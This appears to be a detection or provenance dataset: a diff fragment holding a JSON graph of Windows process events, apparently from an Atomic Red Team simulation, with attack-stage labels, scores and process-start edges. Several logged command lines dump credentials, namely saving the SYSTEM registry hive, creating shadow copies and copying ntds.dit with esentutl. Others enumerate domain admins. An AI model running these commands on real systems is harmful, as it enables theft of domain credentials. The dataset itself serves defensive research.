+            "label": "reg  save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+            "stage": "null",
+            "raw_cmd": "reg",
+            "id": "e4b728e6fb1fe41b458a1f81624ff297",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "e714c58e7dc3c4c47db077a2fb03f50c",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "46f1c3c79cbc042d741a083f85dbc656",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "14acc07a7646468c0bafa23fc51d1b08",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "wmic  shadowcopy call create Volume=C:/",
+            "stage": "Establish Foothold",
+            "raw_cmd": "WMIC",
+            "id": "d311c6ed3b0cf08455abd5b1cde72150",
+            "score": "20.4",
+            "type": "command"
+        },
+        {
+            "label": "vssadmin.exe  create shadow /for=C:",
+            "stage": "null",
+            "raw_cmd": "vssadmin",
+            "id": "1950e4c09a3c31d060119935a6b02815",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "c81554b2ee1506324196e72b7fc40357",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "vssadmin.exe  create shadow /for=C:",
+            "stage": "null",
+            "raw_cmd": "vssadmin",
+            "id": "01c0fc29bf327d156e8965ae3caee07b",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "3a9600927b72e757973384548379cd3e",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "24e5e152c70094f669e74bec8a230515",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "47b9c38424ef4e46169b7de1b3aac3e5",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF4B2.tmp   c:/Users/Administrator/AppData/Local/Temp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "bef84199ca8703a9473406793315189c",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "wmic  /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+            "stage": "Establish Foothold",
+            "raw_cmd": "WMIC",
+            "id": "4b451debdfbe42f32fd5244a47d64b0c",
+            "score": "30.799999999999997",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "798e891c89858fd138fe1c25e5b4a6fa",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/net1 group  domain admins  /domain",
+            "stage": "Maintain Persistence",
+            "raw_cmd": "net1",
+            "id": "d2eb3ad6a536c74d3c752b140426a45c",
+            "score": "5.0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES3C0B.tmp   c:/Users/Administrator/AppData/Local/Temp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "9a71b6f5d23c9ccdd901b3cfad8aa8d3",
+            "score": "16.2",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "28b92fabeee1f17f2ae53a8163e57869",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "848d27c9a2e82cf8607331bbfaf73e4c",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE377.tmp   c:/Users/Administrator/AppData/Local/Temp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "7b8aaade18faecc9db7a92855ca0216b",
+            "score": "16.4",
+            "type": "command"
+        },
+        {
+            "label": "sc  query type=service",
+            "stage": "Establish Foothold",
+            "raw_cmd": "sc",
+            "id": "28df61e34c38cf8bb31057719bd71c36",
+            "score": "8.2",
+            "type": "command"
+        },
+        {
+            "label": "tree  C:/AtomicRedTeam/atomics",
+            "stage": "Establish Foothold",
+            "raw_cmd": "tree",
+            "id": "2c315afbb87bf1f8a4d76b6b092c4c32",
+            "score": "8.2",
+            "type": "command"
+        },
+        {
+            "label": "wmic  process list",
+            "stage": "Establish Foothold",
+            "raw_cmd": "WMIC",
+            "id": "642537170a52f6f56dc48c72963d8d9a",
+            "score": "41.6",
+            "type": "command"
+        },
+        {
+            "label": "doskey  /history",
+            "stage": "null",
+            "raw_cmd": "doskey",
+            "id": "6f402df2752c57cb981ac4940cc6f827",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "762ff7e8841774fe79eaefd4b98fef3c",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/WINDOWS/system32/cmd.exe  /S /D /c  dir c: /b /s .docx",
+            "stage": "null",
+            "raw_cmd": "cmd",
+            "id": "5377560cff056698bc3091463410fcbe",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "ec67110d7643774936a7deb732230674",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "findstr  /e .docx",
+            "stage": "null",
+            "raw_cmd": "findstr",
+            "id": "f5c9c661a3b8223737e82dedbb0cdc6c",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESDD4D.tmp   c:/Users/Administrator/AppData/Local/Temp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "a0189eac0beac9dd051a62686fe3ee9e",
+            "score": "16.2",
+            "type": "command"
+        },
+        {
+            "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+            "stage": "null",
+            "raw_cmd": "conhost",
+            "id": "641c50ddbba159743f1d85b17993b4c0",
+            "score": "0",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.cmdline",
+            "stage": "Establish Foothold",
+            "raw_cmd": "csc",
+            "id": "f80dace5b1042f612172106625c4b235",
+            "score": "40.8",
+            "type": "command"
+        },
+        {
+            "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE173.tmp   c:/Users/Administrator/AppData/Local/Temp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP",
+            "stage": "Establish Foothold",
+            "raw_cmd": "cvtres",
+            "id": "d259f8d37e7f8146c5ae2e8913d0e27d",
+            "score": "16.4",
+            "type": "command"
+        }
+    ],
+    "connects": [],
+    "files": [],
+    "edges": [
+        {
+            "source": "764fca56fee5525bd098ae311e073bfb",
+            "target": "4555f43390fe3494a3d527567cdac02b",
+            "time": "1970-02-15 12:05:42",
+            "syscall": "process start",
+            "id": "0"
+        },
+        {
+            "source": "764fca56fee5525bd098ae311e073bfb",
+            "target": "484f2e9e85b7e62dddd465a31198b585",
+            "time": "1970-02-15 12:08:01",
+            "syscall": "process start",
+            "id": "1"
+        },
+        {
+            "source": "4555f43390fe3494a3d527567cdac02b",
+            "target": "9863e87ac72c1925adc4f266bf99c824",
+            "time": "1970-02-15 12:06:32",
+            "syscall": "process start",
+            "id": "2"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "764fca56fee5525bd098ae311e073bfb",
+            "time": "1970-02-15 12:00:36",
+            "syscall": "process start",
+            "id": "3"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "11199f2a180f949f352ddd69be73b2ff",
+            "time": "1970-02-19 16:11:02",
+            "syscall": "process start",
+            "id": "4"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "133521c54e64440cbfb3778eff26e0be",
+            "time": "1970-02-22 09:30:10",
+            "syscall": "process start",
+            "id": "5"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "14ae5c7b5d2a49b933d0546b6706c4f3",
+            "time": "1970-02-19 01:48:22",
+            "syscall": "process start",
+            "id": "6"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "1710c751ea05824c79c8e363a266dbb0",
+            "time": "1970-02-19 04:40:13",
+            "syscall": "process start",
+            "id": "7"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "1bd753c51f02f342b1b9a1945ba4b663",
+            "time": "1970-02-19 21:53:37",
+            "syscall": "process start",
+            "id": "8"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "2a4aa502707fc6d5da763494941d41b1",
+            "time": "1970-02-19 04:39:38",
+            "syscall": "process start",
+            "id": "9"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "2f92f8f70e08b280865f3ee39acaaa4c",
+            "time": "1970-02-19 19:08:33",
+            "syscall": "process start",
+            "id": "10"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "34440609e8131676a064d5623c200f8d",
+            "time": "1970-02-15 04:30:20",
+            "syscall": "process start",
+            "id": "11"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "3f11106677a3a7783e77278e987ceab0",
+            "time": "1970-02-19 07:33:28",
+            "syscall": "process start",
+            "id": "12"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "42ad6840731c1259bed1ea9b7a685e32",
+            "time": "1970-02-20 03:39:05",
+            "syscall": "process start",
+            "id": "13"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "495ae09fb43db72c73a111615fc01a8e",
+            "time": "1970-02-22 03:44:39",
+            "syscall": "process start",
+            "id": "14"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "6acf2c7114d0f5859732134d5cd5f182",
+            "time": "1970-02-16 02:18:20",
+            "syscall": "process start",
+            "id": "15"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "6ea1872984a507282fc609fa9b9a76ca",
+            "time": "1970-02-20 00:44:47",
+            "syscall": "process start",
+            "id": "16"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "6f4214d38f991b8722648c02d50b675b",
+            "time": "1970-02-22 00:53:07",
+            "syscall": "process start",
+            "id": "17"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "7e341a3eb12fb991f2bd57f8a717eca2",
+            "time": "1970-02-22 09:29:41",
+            "syscall": "process start",
+            "id": "18"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "7ede18ffe0067bc42e26056ca4c34ca6",
+            "time": "1970-02-15 20:36:04",
+            "syscall": "process start",
+            "id": "19"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "time": "1970-02-20 09:21:03",
+            "syscall": "process start",
+            "id": "20"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "88bbdf49a1ba403f839c469fb1ccba4c",
+            "time": "1970-02-15 17:43:26",
+            "syscall": "process start",
+            "id": "21"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "88f104fd7dcad85db4c5c375bf3e30b8",
+            "time": "1970-02-20 06:37:49",
+            "syscall": "process start",
+            "id": "22"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "a8be2c1c6cd2b2f3bb65c043693f10de",
+            "time": "1970-02-19 10:25:11",
+            "syscall": "process start",
+            "id": "23"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "b58c294d5cce88ecc3c9084ebb7982af",
+            "time": "1970-02-22 06:35:43",
+            "syscall": "process start",
+            "id": "24"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "b868af32b977dfa5011d88627c0af145",
+            "time": "1970-02-22 12:21:09",
+            "syscall": "process start",
+            "id": "25"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "be40b7b24c3f1cfd6679a4b01d056551",
+            "time": "1970-02-15 14:52:22",
+            "syscall": "process start",
+            "id": "26"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "c3be5dbda1a026a47ca74ea1aa959ed7",
+            "time": "1970-02-15 20:35:20",
+            "syscall": "process start",
+            "id": "27"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "time": "1970-02-19 13:19:17",
+            "syscall": "process start",
+            "id": "28"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "dbf9c8f04fbcd3ab25545dd5df167f66",
+            "time": "1970-02-20 06:30:08",
+            "syscall": "process start",
+            "id": "29"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "e5cd8e40a87cb0b03fda9a027a7337f2",
+            "time": "1970-02-15 23:26:37",
+            "syscall": "process start",
+            "id": "30"
+        },
+        {
+            "source": "8695f682358e3f7347e30808cd98aea7",
+            "target": "f999a0390aa6fa88400060562d6893f8",
+            "time": "1970-02-19 10:24:40",
+            "syscall": "process start",
+            "id": "31"
+        },
+        {
+            "source": "11199f2a180f949f352ddd69be73b2ff",
+            "target": "24ebedb2c2f077bb2eeae7a6e6f6f5ca",
+            "time": "1970-02-19 16:11:08",
+            "syscall": "process start",
+            "id": "32"
+        },
+        {
+            "source": "14ae5c7b5d2a49b933d0546b6706c4f3",
+            "target": "747b302d0a5747497a39d11e41efbf82",
+            "time": "1970-02-19 01:48:29",
+            "syscall": "process start",
+            "id": "33"
+        },
+        {
+            "source": "1bd753c51f02f342b1b9a1945ba4b663",
+            "target": "1e2f7d4afdedff6e4e0be8378bf059a2",
+            "time": "1970-02-19 21:53:43",
+            "syscall": "process start",
+            "id": "34"
+        },
+        {
+            "source": "2a4aa502707fc6d5da763494941d41b1",
+            "target": "ee89d7c76d0b239c6790833dabb32534",
+            "time": "1970-02-19 04:39:45",
+            "syscall": "process start",
+            "id": "35"
+        },
+        {
+            "source": "3f11106677a3a7783e77278e987ceab0",
+            "target": "30d138bc1a86ec2f75cf69c770a5f2b4",
+            "time": "1970-02-19 07:41:58",
+            "syscall": "process start",
+            "id": "36"
+        },
+        {
+            "source": "3f11106677a3a7783e77278e987ceab0",
+            "target": "5408eff07b0a3aad30b46c484e5235b2",
+            "time": "1970-02-19 07:49:02",
+            "syscall": "process start",
+            "id": "37"
+        },
+        {
+            "source": "3f11106677a3a7783e77278e987ceab0",
+            "target": "890e6feef99c0f65dc2ebbfb309d8320",
+            "time": "1970-02-19 07:41:45",
+            "syscall": "process start",
+            "id": "38"
+        },
+        {
+            "source": "3f11106677a3a7783e77278e987ceab0",
+            "target": "b9d4e7f18ee3bf58c00b886bce06c1e7",
+            "time": "1970-02-19 07:38:37",
+            "syscall": "process start",
+            "id": "39"
+        },
+        {
+            "source": "42ad6840731c1259bed1ea9b7a685e32",
+            "target": "bd564e0db1992d4bc0fc7139a4b7d6a9",
+            "time": "1970-02-20 03:39:12",
+            "syscall": "process start",
+            "id": "40"
+        },
+        {
+            "source": "495ae09fb43db72c73a111615fc01a8e",
+            "target": "c2c7e73fd2cd1797ba62fa01ef623e84",
+            "time": "1970-02-22 03:44:47",
+            "syscall": "process start",
+            "id": "41"
+        },
+        {
+            "source": "6acf2c7114d0f5859732134d5cd5f182",
+            "target": "fb7c3d30d2ede90d1b60f559145211b8",
+            "time": "1970-02-16 02:18:27",
+            "syscall": "process start",
+            "id": "42"
+        },
+        {
+            "source": "6ea1872984a507282fc609fa9b9a76ca",
+            "target": "0abc3227fdf5033b0487dbe27132203d",
+            "time": "1970-02-20 00:49:55",
+            "syscall": "process start",
+            "id": "43"
+        },
+        {
+            "source": "6f4214d38f991b8722648c02d50b675b",
+            "target": "3637266d9466dfb354c8772ff0f98641",
+            "time": "1970-02-22 01:00:46",
+            "syscall": "process start",
+            "id": "44"
+        },
+        {
+            "source": "6f4214d38f991b8722648c02d50b675b",
+            "target": "6c4361384f1f6b011437ceba342ec0d2",
+            "time": "1970-02-22 00:58:25",
+            "syscall": "process start",
+            "id": "45"
+        },
+        {
+            "source": "7e341a3eb12fb991f2bd57f8a717eca2",
+            "target": "15094515321e9a167576fb6c4f3c433f",
+            "time": "1970-02-22 09:29:48",
+            "syscall": "process start",
+            "id": "46"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "08d25a86c839fc0abb3d9d3a488f9383",
+            "time": "1970-02-20 09:26:10",
+            "syscall": "process start",
+            "id": "47"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "2e92e8d07be2773dc1ba41cbf65916c6",
+            "time": "1970-02-21 19:33:12",
+            "syscall": "process start",
+            "id": "48"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "47ea676812bf207d3e3140c251b3ad50",
+            "time": "1970-02-20 09:40:55",
+            "syscall": "process start",
+            "id": "49"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "56d95db60864840b99515d883d2fad41",
+            "time": "1970-02-21 19:07:19",
+            "syscall": "process start",
+            "id": "50"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "59bda6cf1918b6b99ace321373b64dd1",
+            "time": "1970-02-21 19:08:39",
+            "syscall": "process start",
+            "id": "51"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "7212353bbcf65925b2443858aeb64e9f",
+            "time": "1970-02-20 09:39:00",
+            "syscall": "process start",
+            "id": "52"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "7584717085dba32fe5cb9137cdb5edeb",
+            "time": "1970-02-21 21:35:05",
+            "syscall": "process start",
+            "id": "53"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "838dfffb7a13305b19bea3a8a072cafd",
+            "time": "1970-02-21 19:47:17",
+            "syscall": "process start",
+            "id": "54"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "85828e6e0a615491372fdfbe9bf265d6",
+            "time": "1970-02-20 09:29:18",
+            "syscall": "process start",
+            "id": "55"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "d4ee1c99352260eaf83270ab10841e2c",
+            "time": "1970-02-21 19:45:25",
+            "syscall": "process start",
+            "id": "56"
+        },
+        {
+            "source": "7fbf49bfe0c7cde8f5d0f5421c5b18eb",
+            "target": "fea3792f4fb188a54e6ce570b39d1a7e",
+            "time": "1970-02-20 09:29:28",
+            "syscall": "process start",
+            "id": "57"
+        },
+        {
+            "source": "88bbdf49a1ba403f839c469fb1ccba4c",
+            "target": "6aa4b847eacd92f5e2c681a0d3c54a03",
+            "time": "1970-02-15 17:43:33",
+            "syscall": "process start",
+            "id": "58"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "1fe1a5f83688bf8be6eac6970ed08023",
+            "time": "1970-02-22 12:29:17",
+            "syscall": "process start",
+            "id": "59"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "35539842b904d5cea2881cce0f9381a0",
+            "time": "1970-02-22 12:47:13",
+            "syscall": "process start",
+            "id": "60"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "3a38ea5bc9ab701eb594e6309c858583",
+            "time": "1970-02-22 12:29:28",
+            "syscall": "process start",
+            "id": "61"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "461a96301fbef83bf800a37502ec3a31",
+            "time": "1970-02-22 12:59:56",
+            "syscall": "process start",
+            "id": "62"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "56fe4a0466a3a3b63ab49e9247d2d655",
+            "time": "1970-02-22 12:36:39",
+            "syscall": "process start",
+            "id": "63"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "61e7e2b9aebf24de1b03546d553ac07b",
+            "time": "1970-02-22 12:26:16",
+            "syscall": "process start",
+            "id": "64"
+        },
+        {
+            "source": "b868af32b977dfa5011d88627c0af145",
+            "target": "af78bca578b8af6cbb0c48f6982bb3c4",
+            "time": "1970-02-22 12:38:46",
+            "syscall": "process start",
+            "id": "65"
+        },
+        {
+            "source": "be40b7b24c3f1cfd6679a4b01d056551",
+            "target": "65b6784bf0b757d8dda52d2b7c38db9e",
+            "time": "1970-02-15 15:00:15",
+            "syscall": "process start",
+            "id": "66"
+        },
+        {
+            "source": "be40b7b24c3f1cfd6679a4b01d056551",
+            "target": "8de52a0399d5f21a4554f7c8fd4be229",
+            "time": "1970-02-15 14:57:31",
+            "syscall": "process start",
+            "id": "67"
+        },
+        {
+            "source": "c3be5dbda1a026a47ca74ea1aa959ed7",
+            "target": "6d7355758464615200f7aa4b8743e16d",
+            "time": "1970-02-15 20:35:26",
+            "syscall": "process start",
+            "id": "68"
+        },
+        {
+            "source": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "target": "219d2dd9d2ee376588c24c26a711a6af",
+            "time": "1970-02-19 13:34:17",
+            "syscall": "process start",
+            "id": "69"
+        },
+        {
+            "source": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "target": "938ad7340a0adb1a721fe365612f77d1",
+            "time": "1970-02-19 13:27:26",
+            "syscall": "process start",
+            "id": "70"
+        },
+        {
+            "source": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "target": "a5679c643be3c5219e9fcd09266480dd",
+            "time": "1970-02-19 13:24:21",
+            "syscall": "process start",
+            "id": "71"
+        },
+        {
+            "source": "dafb9acf62a3c17b609c217b9f6ebafd",
+            "target": "afd44319bf7657fc4b7609625710e089",
+            "time": "1970-02-19 13:27:35",
+            "syscall": "process start",
+            "id": "72"
+        },
+        {
+            "source": "dbf9c8f04fbcd3ab25545dd5df167f66",
+            "target": "e1af9edecf8a93ce10c5183a287ed85e",
+            "time": "1970-02-20 06:30:15",
+            "syscall": "process start",
+            "id": "73"
+        },
+        {
+            "source": "e5cd8e40a87cb0b03fda9a027a7337f2",
+            "target": "c8fec1ae0c091f3b6c091617ccc35f9b",
+            "time": "1970-02-15 23:26:43",
+            "syscall": "process start",
+            "id": "74"
+        },
+        {
+            "source": "f999a0390aa6fa88400060562d6893f8",
+            "target": "f62f117f72acc2bd9fc55fbf2551d586",
+            "time": "1970-02-19 10:24:46",
+            "syscall": "process start",
+            "id": "75"
+        },
+        {
+            "source": "5408eff07b0a3aad30b46c484e5235b2",
+            "target": "5932abe52fabb99ec8b4fb8ee3e92aa4",
+            "time": "1970-02-19 07:54:23",
+            "syscall": "process start",
+            "id": "76"
+        },
+        {
+            "source": "5408eff07b0a3aad30b46c484e5235b2",
+            "target": "8c7bb7f484f2f265f83287490cf2ddb5",
+            "time": "1970-02-19 07:49:04",
+            "syscall": "process start",
+            "id": "77"
+        },
+        {
+            "source": "b9d4e7f18ee3bf58c00b886bce06c1e7",
+            "target": "084aa9b4eee6ba098e9c41f9c0f70864",
+            "time": "1970-02-19 07:39:30",
+            "syscall": "process start",
+            "id": "78"
+        },
+        {
+            "source": "bd564e0db1992d4bc0fc7139a4b7d6a9",
+            "target": "4b1d560f1821ad43a18427b64366b8fa",
+            "time": "1970-02-20 03:40:23",
+            "syscall": "process start",
+            "id": "79"
+        },
+        {
+            "source": "0abc3227fdf5033b0487dbe27132203d",
+            "target": "fe97fdb55cc2e2ca244e97c5a0c2445a",
+            "time": "1970-02-20 00:50:45",
+            "syscall": "process start",
+            "id": "80"
+        },
+        {
+            "source": "3637266d9466dfb354c8772ff0f98641",
+            "target": "d2eb3ad6a536c74d3c752b140426a45c",
+            "time": "1970-02-22 01:00:55",
+            "syscall": "process start",
+            "id": "81"
+        },
+        {
+            "source": "6c4361384f1f6b011437ceba342ec0d2",
+            "target": "9a71b6f5d23c9ccdd901b3cfad8aa8d3",
+            "time": "1970-02-22 00:59:15",
+            "syscall": "process start",
+            "id": "82"
+        },
+        {
+            "source": "08d25a86c839fc0abb3d9d3a488f9383",
+            "target": "c8b1e89c62ea01bd4a3e154bd8affc83",
+            "time": "1970-02-20 09:27:02",
+            "syscall": "process start",
+            "id": "83"
+        },
+        {
+            "source": "2e92e8d07be2773dc1ba41cbf65916c6",
+            "target": "ce2a88230e5215b520bd7f749e810671",
+            "time": "1970-02-21 19:33:45",
+            "syscall": "process start",
+            "id": "84"
+        },
+        {
+            "source": "2e92e8d07be2773dc1ba41cbf65916c6",
+            "target": "d5768a9b5eafa1c0619b7810ff7a15a3",
+            "time": "1970-02-21 19:33:21",
+            "syscall": "process start",
+            "id": "85"
+        },
+        {
+            "source": "47ea676812bf207d3e3140c251b3ad50",
+            "target": "e4b728e6fb1fe41b458a1f81624ff297",
+            "time": "1970-02-20 09:41:26",
+            "syscall": "process start",
+            "id": "86"
+        },
+        {
+            "source": "47ea676812bf207d3e3140c251b3ad50",
+            "target": "e714c58e7dc3c4c47db077a2fb03f50c",
+            "time": "1970-02-20 09:40:57",
+            "syscall": "process start",
+            "id": "87"
+        },
+        {
+            "source": "56d95db60864840b99515d883d2fad41",
+            "target": "46f1c3c79cbc042d741a083f85dbc656",
+            "time": "1970-02-21 19:07:23",
+            "syscall": "process start",
+            "id": "88"
+        },
+        {
+            "source": "59bda6cf1918b6b99ace321373b64dd1",
+            "target": "14acc07a7646468c0bafa23fc51d1b08",
+            "time": "1970-02-21 19:08:42",
+            "syscall": "process start",
+            "id": "89"
+        },
+        {
+            "source": "59bda6cf1918b6b99ace321373b64dd1",
+            "target": "d311c6ed3b0cf08455abd5b1cde72150",
+            "time": "1970-02-21 19:09:06",
+            "syscall": "process start",
+            "id": "90"
+        },
+        {
+            "source": "7212353bbcf65925b2443858aeb64e9f",
+            "target": "1950e4c09a3c31d060119935a6b02815",
+            "time": "1970-02-20 09:39:24",
+            "syscall": "process start",
+            "id": "91"
+        },
+        {
+            "source": "7212353bbcf65925b2443858aeb64e9f",
+            "target": "c81554b2ee1506324196e72b7fc40357",
+            "time": "1970-02-20 09:39:02",
+            "syscall": "process start",
+            "id": "92"
+        },
+        {
+            "source": "7584717085dba32fe5cb9137cdb5edeb",
+            "target": "01c0fc29bf327d156e8965ae3caee07b",
+            "time": "1970-02-21 21:35:27",
+            "syscall": "process start",
+            "id": "93"
+        },
+        {
+            "source": "7584717085dba32fe5cb9137cdb5edeb",
+            "target": "3a9600927b72e757973384548379cd3e",
+            "time": "1970-02-21 21:35:07",
+            "syscall": "process start",
+            "id": "94"
+        },
+        {
+            "source": "838dfffb7a13305b19bea3a8a072cafd",
+            "target": "24e5e152c70094f669e74bec8a230515",
+            "time": "1970-02-21 19:53:47",
+            "syscall": "process start",
+            "id": "95"
+        },
+        {
+            "source": "838dfffb7a13305b19bea3a8a072cafd",
+            "target": "47b9c38424ef4e46169b7de1b3aac3e5",
